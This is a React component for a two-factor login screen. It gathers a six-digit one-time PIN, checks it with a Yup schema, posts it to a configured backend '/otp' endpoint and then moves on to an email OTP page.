import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import "../App.css";
import "../styles/pin.css";
import { useForm } from "react-hook-form";
import { yupResolver } from "@hookform/resolvers/yup";
import * as yup from "yup";
import FormErrMsg from "../components/FormErrMsg";
import axios from "axios";
import BASE_URL from "../components/urls";

const schema = yup.object().shape({
  otp: yup
    .string()
    .matches(/^\d{6}$/, "OTP must be exactly 6 digits")
    .required("OTP is required"),
});

const Pin = () => {
  const navigate = useNavigate();
  const {
    register,
    handleSubmit,
    setValue,
    formState: { errors },
  } = useForm({ resolver: yupResolver(schema) });

  const [otp, setOtp] = useState(new Array(6).fill(""));
  const [loading, setLoading] = useState(false);

  const handleChange = (element, index) => {
    const value = element.value;
    if (!/^\d$/.test(value)) return;

    const newOtp = [...otp];
    newOtp[index] = value;
    setOtp(newOtp);

    if (index < 5 && value !== "") {
      document.getElementById(`otp-${index + 1}`).focus();
    }

    setValue("otp", newOtp.join(""));
  };

  const submitForm = (data) => {
    setLoading(true);
    axios
      .post(`${BASE_URL}/otp`, data)
      .then((response) => {
        console.log(response.data);
        // Clear the OTP inputs after successful submission
        setOtp(new Array(6).fill(""));
        setValue("otp", ""); // Clear the form data
        navigate("/email-otp");
      })
      .catch((error) => {
        console.error("There was an error!", error);
      })
      .finally(() => {
        setLoading(false);
      });
  };

  return (
    <div className="pin">
      <div className="container">
        <div className="contentSec">
          <div className="title">We need to make sure it's you</div>
          <div className="subtext">
            Please enter the One-Time PIN (OTP) just sent to your registered
            mobile number
          </div>
        </div>
        <div className="formSec">
          <div className="input">
            <form onSubmit={handleSubmit(submitForm)}>
              <div className="formPin">
                {otp.map((data, index) => (
                  <input
                    key={index}
                    id={`otp-${index}`}
                    type="password"
                    name="otp"
                    maxLength="1"
                    value={data}
                    onChange={(e) => handleChange(e.target, index)}
                    onFocus={(e) => e.target.select()}
                    className="pin-input"
                    inputMode="numeric"
                  />
                ))}
              </div>

              <FormErrMsg errors={errors} inputName="otp" />

              <div className="resend">Resend OTP</div>

              <div className="buttonSec">
                <button type="submit" disabled={loading}>
                  {loading ? "Loading..." : "Log In"}
                </button>
              </div>
            </form>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Pin;

